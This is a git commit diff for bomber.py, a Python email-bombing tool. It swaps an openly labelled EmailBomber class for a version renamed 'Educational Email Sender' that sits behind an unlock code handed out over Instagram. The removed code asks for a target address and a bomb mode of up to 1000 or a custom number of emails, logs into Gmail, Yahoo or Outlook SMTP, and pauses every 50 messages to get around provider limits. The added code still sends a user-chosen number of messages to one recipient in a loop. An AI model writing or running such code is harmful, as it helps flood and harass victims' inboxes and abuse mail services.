14b03ea5d1e2ba0e6efbc881213a86e4af3fd710
CPS <98105494+cyberphantomsyndicate@users.noreply.github.com>
2024-11-10 04:57:07 -0800

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -1,186 +1,94 @@
-import time #line:3
-from colorama import Fore ,Back ,Style ,init #line:4
-init (autoreset =True )#line:5
-def startMessage ():#line:7
-    OO0O0OO0OOO0OO0O0 =input (Fore .YELLOW +"Enter Code To Unlock The Tool : ")#line:8
-    OOOO0OO000OO0OOOO ="iloveu"#line:9
-    if OOOO0OO000OO0OOOO !=OO0O0OO0OOO0OO0O0 :#line:10
-        print (Fore .RED +'[X] Wrong Code')#line:11
-        print (Fore .BLUE +''' 
-   1. Go to Insta and massage 
-   2. Insta ID: qadirahmad6291
-   3. Send massage for code
-   4. Next time come with code and use this tool
-   5. bye
-    ''')#line:18
-        startMessage ()#line:19
-    else :#line:20
-        print (Fore .GREEN +"Successfully Unlocked Tool!")#line:21
-        pass #line:22
-if __name__ =="__main__":#line:24
-    startMessage ()#line:25
 import smtplib
-import sys
+import hashlib
 import time
+from colorama import Fore, init
+import pyfiglet
+import sys
 
+init(autoreset=True)
 
-class bColors:
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    BLUE = '\033[94m'
+def generate_hacker_logo():
+    hacker_logo = pyfiglet.figlet_format("CPS", font="slant")
+    return hacker_logo
 
+def type_writer_effect(message, speed=0.1):
+    for char in message:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
 
-def banner():
-    print(bColors.BLUE + '<<< HI Friends>>>')
-    print(bColors.YELLOW + r'''
-  _
- | |
- | |___
- |  _  \ _   _
- | |_)  | (_) |
-  \____/ \__, |
-          __/ |
-         |___/
-                                                                                                 _
- / _ \    / \  |  _ \_ _|  _ \
-| | | |  / _ \ | | | | || |_) |
-| |_| | / ___ \| |_| | ||  _ <
- \__\_\/_/   \_\____/___|_| \_\
-                                                      (_)
+quote1 = "If you've been betrayed in love, make sure to tell me, all characterless are our enemies"
+quote2 = "We don't hack to impress, we hack to express."
 
-     ''')
+print(Fore.GREEN + generate_hacker_logo())
+print("\n")
+print("\n--- Incoming Message ---\n")
+time.sleep(1)
+type_writer_effect(">>> " + quote1, speed=0.05)
+type_writer_effect(">>> " + quote2, speed=0.05)
 
+MAX_ATTEMPTS = 3
+LOCK_DURATION = 30
 
-class EmailBomber:
-    count = 0
+try:
+    with open("pass.txt", "r") as f:
+        HASHED_PASSWORD = f.read().strip()
+except FileNotFoundError:
+    print(Fore.RED + "Password file 'pass.txt' not found.")
+    exit(1)
 
-    def __init__(self):
-        self.countFactor = None
-        self.amount = None
-        self.port = None
-        self.server = None
-        self.fromAddr = None
-        self.fromPwd = None
-        self.subject = None
-        self.message = None
-        self.msg = None
-        self.s = None
-        self.r = bColors.RED
-        self.g = bColors.GREEN
-        self.b = bColors.BLUE
-        self.y = bColors.YELLOW
-        try:
-            print(self.b + '\n[+] Initializing bomber ...')
-            self.target = str(input(self.g + '[:] Enter Target Email > '))
-            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))
+def check_password():
+    attempts = 0
+    while attempts < MAX_ATTEMPTS:
+        entered_password = input(Fore.YELLOW + "Enter Code To Unlock The Tool: ")
+        hashed_entered_password = hashlib.sha256(entered_password.encode()).hexdigest()
+        
+        if hashed_entered_password == HASHED_PASSWORD:
+            print(Fore.GREEN + "Successfully Unlocked Tool!")
+            return True
+        else:
+            attempts += 1
+            print(Fore.RED + "[X] Wrong Code")
+            print(Fore.BLUE + '''
+   1. Go to Insta and message 
+   2. Insta ID: cyberphantomsyndicate
+   3. Send message for code
+   4. Next time come with code and use this tool
+   5. Bye
+    ''')
 
-            if int(self.mode) > int(4) or int(self.mode) < int(1):
-                print(self.r + '[-] ERROR: Invalid Option!')
-                sys.exit(0)
+    print(Fore.RED + "Too many incorrect attempts. Tool is temporarily locked.")
+    time.sleep(LOCK_DURATION)
+    return False
 
-        except Exception as e:
-            print(self.r + f'\n[-] ERROR: {e}')
-            sys.exit(0)
+if not check_password():
+    exit("Exiting program due to failed unlock attempts.")
 
-    def bomb(self):
-        try:
-            print(self.b + '\n[+] Setting up bomb ...')
+def send_email(to_email, from_email, password, subject, message, server="smtp.gmail.com", port=587):
+    try:
+        with smtplib.SMTP(server, port) as smtp:
+            smtp.starttls()
+            smtp.login(from_email, password)
+            email_message = f"Subject: {subject}\n\n{message}"
+            smtp.sendmail(from_email, to_email, email_message)
+            print(Fore.GREEN + f"Email sent to {to_email}")
+    except Exception as e:
+        print(Fore.RED + f"Failed to send email: {e}")
 
-            if self.mode == int(1):
-                self.amount = int(1000)
-            elif self.mode == int(2):
-                self.amount = int(500)
-            elif self.mode == int(3):
-                self.amount = int(250)
-            else:
-                self.amount = int(input(self.g + '[:] Choose a CUSTOM amount > '))
-            print(self.g + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')
+def main():
+    print(Fore.YELLOW + "=== Educational Email Sender ===")
+    from_email = input("Enter your email address: ")
+    password = input("Enter your email password: ")
+    to_email = input("Enter the recipient's email address: ")
+    subject = input("Enter the subject of the email: ")
+    message = input("Enter the message content: ")
+    count = int(input("Enter the number of emails to send (educational limit): "))
 
-        except Exception as e:
-            print(self.r + f'\n[-] ERROR: {e}')
-            sys.exit(0)
+    for i in range(count):
+        print(Fore.BLUE + f"Sending email {i + 1} of {count}...")
+        send_email(to_email, from_email, password, subject, message)
+        time.sleep(1)
 
-    def email(self):
-        try:
-            print(self.b + '\n[+] Setting up email ...')
-            self.server = str(input(self.g + '[:] Enter email server | or select premade options - 1:Gmail 2:Yahoo '
-                                             '3:Outlook 4:Custom > '))
-            defaultPort = True
-
-            if self.server == '4':
-                defaultPort = False
-                self.port = int(input(self.g + '[:] Enter port number > '))
-
-            if defaultPort:
-                self.port = int(587)
-
-            if self.server == '1':
-                self.server = 'smtp.gmail.com'
-            elif self.server == '2':
-                self.server = 'smtp.mail.yahoo.com'
-            elif self.server == '3':
-                self.server = 'smtp-mail.outlook.com'
-
-            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > '))
-            self.fromPwd = str(input(self.g + '[:] Enter attacker password > '))
-            self.subject = str(input(self.g + '[:] Enter subject > '))
-            self.message = str(input(self.g + '[:] Enter message > '))
-
-            if self.target == self.fromAddr:
-                print(self.r + '\n[-] ERROR: Can\'t have same Attacker and Target address.')
-
-            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
-                        ''' % (self.fromAddr, self.target, self.subject, self.message)
-
-            self.s = smtplib.SMTP(self.server, self.port)
-            self.s.ehlo()
-            self.s.starttls()
-            self.s.ehlo()
-            self.s.login(self.fromAddr, self.fromPwd)
-
-        except Exception as e:
-            print(self.r + f'\n[-] ERROR: {e}')
-            sys.exit(0)
-
-    def send(self):
-        try:
-            self.s.sendmail(self.fromAddr, self.target, self.message)
-            self.count += 1
-            loadSeq = float(self.count) * self.countFactor
-            sys.stdout.write(self.y + '\r' + '[BOMBED EMAILS:' + self.b + f' {self.count}' + self.y + ']' + self.b +
-                             ' [' + self.g + ('#' * int(loadSeq)) + self.b + ']')
-            sys.stdout.flush()
-            if self.count % 50 == 0 and self.count != self.amount:
-                time.sleep(0.5)
-                sys.stdout.flush()
-                waitLimit = 60
-                while waitLimit > 0:
-                    sys.stdout.write(self.r + '\r' + f'[↻] Sent {self.count} emails ... RESETTING CONNECTION !! => ' +
-                                     self.y + ' Wait for ' + str(waitLimit) + ' seconds')
-                    time.sleep(1)
-                    waitLimit -= 1
-                    sys.stdout.flush()
-
-        except Exception as e:
-            print(self.r + f'\n[-] ERROR: {e}')
-            sys.exit(0)
-
-    def attack(self):
-        print(self.b + '\n[+] Attacking ...')
-        print(self.y + '\r' + '[' + self.r + '☠' + self.y + '] BOMBING emails')
-        self.countFactor = float(100 / self.amount)
-        for email in range(self.amount):
-            self.send()
-        self.s.close()
-        print(self.g + '\n[+] Attack Finished !!')
-        print(self.g + f'[+] Successfully BOMBED {self.amount} emails !!')
-        sys.exit(0)
-
-
-if __name__ == '__main__':
-    banner()
-    bomb = EmailBomber()
-    bomb.bomb()
-    bomb.email()
-    bomb.attack()
+if __name__ == "__main__":
+    main()
